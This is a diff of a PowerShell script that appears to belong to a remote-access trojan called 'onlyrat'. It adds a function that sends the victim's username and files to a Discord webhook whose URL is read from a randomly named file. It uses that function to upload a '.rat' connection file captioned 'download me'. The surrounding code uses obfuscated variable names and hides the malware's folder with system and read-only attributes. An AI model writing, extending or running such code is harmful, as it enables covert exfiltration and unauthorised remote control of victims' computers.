@@ -1,5 +1,27 @@
 # TODO: incorporate necessary payload installs
 
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = Get-Content lawFvVTikZ.txt | Out-String
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
 function RpLGWiUsIy {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
 }
@@ -57,8 +79,9 @@ Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote port
 Add-Content -Path $CRYnrkaDbe -Value 'local' # connection type
 
 # send file to webhook
-$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
-Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $PEBgxuJUfd"
+Upload-Discord -file "$env:username.rat" -text "download me"
+#$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
+#Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $PEBgxuJUfd"
 
 # cleanup
 attrib +h +s +r C:/Users/onlyrat 
